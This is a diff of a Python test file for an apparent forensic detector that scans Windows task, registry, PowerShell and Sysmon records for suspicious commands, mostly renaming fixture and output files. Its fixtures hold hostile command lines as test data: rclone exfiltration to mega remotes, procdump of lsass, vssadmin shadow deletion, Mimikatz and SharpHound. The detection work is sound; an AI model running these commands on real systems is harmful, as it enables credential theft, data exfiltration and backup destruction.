@@ -48,20 +48,20 @@ def _machine(tmp_path: Path) -> Path:
         / "PSReadLine"
     hist.mkdir(parents=True)
     (hist / "ConsoleHost_history.txt").write_text("Get-Date\nInvoke-Mimikatz\n", encoding="utf-8")
-    _write(c / "Persistence" / "tasks_disk.csv", ["task", "runas", "command"],
+    _write(c / "Persistence" / "art_tasks.csv", ["task", "runas", "command"],
            [["\\Sync", "SYSTEM", r"C:\ProgramData\rclone.exe copy C:\Shares mega:drop"]])
-    _write(c / "Registry" / "reg_services.csv", _REG,
+    _write(c / "Registry" / "art_reg_services.csv", _REG,
            [["ControlSet001\\Services\\Updater", "ImagePath",
              r"C:\Windows\Temp\procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\d.dmp",
              "2026-02-01 09:00:00.1234567"],
             ["ControlSet001\\Services\\Updater", "Description", "vssadmin delete shadows /all", ""]])
-    _write(c / "EventLogs" / "evtx_pwsh.csv", _EVTX,
+    _write(c / "EventLogs" / "art_evtx_powershell.csv", _EVTX,
            [["2026-02-02 10:00:00.0000000", "400", "", "",
              "HostApplication=powershell.exe -c vssadmin delete shadows /all /quiet\n", "", ""],
             ["2026-02-02 10:00:00.0000000", "600", "", "",
              "HostApplication=rclone copy C:\\x mega:y", "", ""]])       # not 400/800: not read
     block = "$a = 1\nrclone.exe copy C:\\Finance mega:loot\nWrite-Output $a"
-    _write(c / "EventLogs" / "evtx_pwshScrip.csv", _EVTX,
+    _write(c / "EventLogs" / "art_evtx_powershell_scripts.csv", _EVTX,
            [["2026-02-05 11:00:00.0000000", "4104", "HOST-01\\jdoe", "", "", "",
              _payload(MessageNumber="1", ScriptBlockText=block)],         # the log is not in order
             ["2026-02-03 11:00:00.0000000", "4104", "HOST-01\\jdoe", "", "", "",
@@ -73,7 +73,7 @@ def _machine(tmp_path: Path) -> Path:
              _payload(ContextInfo="Host Application = powershell.exe",
                       Payload='CommandInvocation(Invoke-WebRequest): "Invoke-WebRequest" '
                               'ParameterBinding: name="Uri"; value="https://transfer.sh/x"')]])
-    _write(c / "EventLogs" / "evtx_sysmon.csv", _EVTX,
+    _write(c / "EventLogs" / "art_evtx_sysmon.csv", _EVTX,
            [["2026-02-06 13:00:00.0000000", "1", "HOST-01\\jdoe", "", "", "SharpHound.exe -c All", ""],
             ["2026-02-06 13:00:00.0000000", "3", "HOST-01\\jdoe", "", "", "SharpHound.exe -c All", ""]])
     res = vol / "Velociraptor" / "LiveResponse" / "results"
@@ -110,16 +110,16 @@ def test_a_script_block_is_searched_line_by_line_and_counted(tmp_path):
     vol = _machine(tmp_path)
     H.run(_ctx(vol))
     out = vol / "CSVs" / "Detections" / ".work_cmd_hunt"
-    ex = [r for r in _read(out / "exfil_commands.csv") if r["source"] == "ps_scriptblock"]
+    ex = [r for r in _read(out / "alert_exfil_commands.csv") if r["source"] == "ps_scriptblock"]
     assert [(r["command"], r["count"], r["first_seen_utc"], r["last_seen_utc"]) for r in ex] == [
         (r"rclone.exe copy C:\Finance mega:loot", "2", "2026-02-03 11:00:00", "2026-02-05 11:00:00")]
-    assert {r["source"] for r in _read(out / "exfil_commands.csv")} >= {"task", "process", "ps_scriptblock"}
+    assert {r["source"] for r in _read(out / "alert_exfil_commands.csv")} >= {"task", "process", "ps_scriptblock"}
 
 
 def test_suspicious_commands_keep_the_action_categories(tmp_path):
     vol = _machine(tmp_path)
     H.run(_ctx(vol))
-    rows = _read(vol / "CSVs" / "Detections" / ".work_cmd_hunt" / "suspicious_commands.csv")
+    rows = _read(vol / "CSVs" / "Detections" / ".work_cmd_hunt" / "alert_suspicious_commands.csv")
     got = {(r["category"], r["source"]) for r in rows}
     assert ("lsass_dump", "service") in got                    # procdump ... lsass
     assert ("shadow_delete", "ps_host") in got                 # vssadmin delete shadows
